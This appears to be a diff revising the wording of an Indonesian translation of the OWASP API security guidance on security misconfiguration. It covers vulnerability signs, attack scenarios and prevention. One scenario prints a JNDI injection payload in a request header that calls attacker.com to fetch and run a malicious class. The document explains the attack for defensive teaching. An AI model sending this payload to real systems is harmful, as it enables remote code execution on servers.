@@ -2,23 +2,23 @@
 
 | Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |
 | - | - | - |
-| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Meluas **Disebarluaskan** : Kemungkinan Dideteksi **Mudah** | Teknis **Parah** : Khusus Bisnis |
-| Penyerang sering mencoba menemukan kelemahan yang belum diperbaiki, titik akhir umum, layanan yang berjalan dengan konfigurasi default yang tidak aman, atau file dan direktori yang tidak terlindungi untuk mendapatkan akses tidak sah atau pengetahuan tentang sistem. Sebagian besar informasi ini adalah pengetahuan publik dan eksploitasi mungkin tersedia. | Konfigurasi keamanan dapat terjadi di semua tingkat tumpukan API, mulai dari tingkat jaringan hingga tingkat aplikasi. Alat otomatis tersedia untuk mendeteksi dan mengeksploitasi konfigurasi yang salah seperti layanan yang tidak perlu atau opsi warisan. | Konfigurasi keamanan tidak hanya mengekspos data pengguna yang sensitif, tetapi juga detail sistem yang dapat menyebabkan kompromi penuh server. |
+| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Prevalensi **Luas** : Kemungkinan Dideteksi **Mudah** | Teknis **Parah** : Khusus Bisnis |
+| Penyerang sering mencoba menemukan kelemahan yang belum diperbaiki, endpoint umum, layanan yang berjalan dengan konfigurasi default yang tidak aman, atau file dan direktori yang tidak terlindungi untuk mendapatkan akses tidak sah atau pengetahuan tentang sistem. Sebagian besar informasi ini adalah pengetahuan publik dan eksploitasi mungkin tersedia. | Kesalahan konfigurasi keamanan dapat terjadi di semua tingkat stack API, mulai dari tingkat jaringan hingga tingkat aplikasi. Alat otomatis tersedia untuk mendeteksi dan mengeksploitasi kesalahan konfigurasi seperti layanan yang tidak perlu atau opsi warisan. | Kesalahan konfigurasi keamanan tidak hanya mengekspos data pengguna yang sensitif, tetapi juga detail sistem yang dapat menyebabkan kompromi penuh server. |
 
 ## Apakah API Rentan?
 
-API dapat rentan jika:
+API menjadi rentan bila:
 
-* Penguncian keamanan yang sesuai hilang di seluruh bagian tumpukan API,
+* Tidak ada penguncian keamanan yang sesuai di seluruh bagian stack API,
   atau izin yang dikonfigurasi dengan tidak benar pada layanan cloud
-* Patch keamanan terbaru hilang, atau sistem sudah kadaluwarsa
+* Tidak ada patch keamanan terbaru, atau sistem sudah kadaluwarsa
 * Fitur yang tidak diperlukan diaktifkan (misalnya, verba HTTP, fitur logging)
 * Ada ketidaksesuaian dalam cara permintaan masuk diproses oleh server
   dalam rantai server HTTP
-* Keamanan Lapisan Transportasi (TLS) hilang
+* Tidak ada Keamanan Lapisan Transportasi (TLS)
 * Direktif keamanan atau kendali cache tidak dikirimkan kepada klien
-* Kebijakan Cross-Origin Resource Sharing (CORS) hilang atau diatur dengan tidak benar
-* Pesan kesalahan mencakup jejak tumpukan, atau mengekspos informasi sensitif lainnya
+* Kebijakan Cross-Origin Resource Sharing (CORS) hilang atau tidak diatur dengan tepat
+* Pesan kesalahan mencakup stack trace, atau mengekspos informasi sensitif lainnya
 
 ## Contoh Skenario Serangan
 
@@ -35,8 +35,8 @@ GET /health
 X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
 ```
 
-Karena konfigurasi default yang tidak aman dari utilitas logging dan kebijakan keluar jaringan yang longgar, untuk menulis entri yang sesuai
-ke file log akses, sambil memperluas nilai dalam header permintaan `X-Api-Version`, utilitas logging akan menarik dan menjalankan objek `Malicious.class` dari server yang dikendalikan oleh pelaku jahat.
+Karena konfigurasi default yang tidak aman dari utilitas logging dan kebijakan keluar jaringan yang longgar, dalam rangka menulis entri yang sesuai
+ke file log akses, sambil memperluas nilai dalam header permintaan `X-Api-Version`, utilitas logging akan mengambil dan menjalankan objek `Malicious.class` dari server yang dikendalikan oleh pelaku jahat.
 
 ### Skenario #2
 
@@ -47,16 +47,15 @@ mempertahankan percakapan pribadi. Untuk mengambil pesan baru untuk percakapan t
 GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
 ```
 
-Karena tanggapan API tidak termasuk header tanggapan HTTP `Cache-Control`, percakapan pribadi akan disimpan dalam cache browser web, memungkinkan
+Karena tanggapan API tidak menyertakaj header tanggapan HTTP `Cache-Control`, percakapan pribadi akan disimpan dalam cache browser web, memungkinkan
 pelaku jahat mengambilnya dari file cache browser dalam sistem file.
 
 ## Cara Mencegah
 
 Siklus hidup API harus mencakup:
 
-* Proses penguncian berulang yang mengarah pada penerapan lingkungan yang terkunci dengan baik
-  atau jika izin dikonfigurasi dengan tidak benar pada layanan cloud
-* Tugas untuk meninjau dan memperbarui konfigurasi di seluruh tumpukan API. Tinjauan harus mencakup: file orkestrasi, komponen API, dan layanan cloud
+* Proses pengerasan berulang yang menghasilkan penerapan lingkungan yang terkunci dengan benar dengan cepat dan mudah
+* Tugas untuk meninjau dan memperbarui konfigurasi di seluruh stack API. Tinjauan harus mencakup: file orkestrasi, komponen API, dan layanan cloud
   (misalnya, izin bucket S3)
 * Proses otomatis untuk terus-menerus menilai efektivitas konfigurasi dan pengaturan di semua lingkungan
 
@@ -64,13 +63,12 @@ Selain itu:
 
 * Pastikan semua komunikasi API dari klien ke server API dan komponen hulu/hilir terjadi melalui saluran komunikasi yang terenkripsi
   (TLS), tanpa memandang apakah itu API internal atau publik.
-* Jadilah spesifik tentang verba HTTP mana pun yang dapat diakses oleh setiap API: semua verba HTTP lainnya harus dinonaktifkan (misalnya, HEAD).
+* Lebih spesifik tentang verba HTTP mana pun yang dapat diakses oleh setiap API: semua verba HTTP lainnya harus dinonaktifkan (misalnya, HEAD).
 * API yang diharapkan diakses dari klien berbasis browser (misalnya, front-end WebApp) harus setidaknya:
-  * mengimplementasikan kebijakan Cross-Origin Resource Sharing (CORS) yang benar
+  * mengimplementasikan kebijakan Cross-Origin Resource Sharing (CORS) yang tepat
   * menyertakan Header Keamanan yang berlaku
-* Batasi jenis konten/mode data masuk hanya pada yang memenuhi persyaratan bisnis/fungsional.
-* Pastikan semua server dalam rantai server HTTP (misalnya, penyeimbang beban, proxy mundur
-  dan maju, serta server backend) memproses permintaan masuk dengan cara yang seragam untuk menghindari masalah desinkronisasi.
+* Batasi jenis konten/format data masuk hanya pada yang memenuhi persyaratan bisnis/fungsional.
+* Pastikan semua server dalam rantai server HTTP (misalnya, load balancer, reverse and forward proxy, serta server backend) memproses permintaan masuk dengan cara yang seragam untuk menghindari masalah desinkronisasi.
 * Jika memungkinkan, tentukan dan tegakkan semua skema muatan respons API, termasuk respons kesalahan, untuk mencegah pengecualian jejak dan informasi berharga lainnya dikirimkan kembali kepada pelaku serangan.
 
 ## Referensi
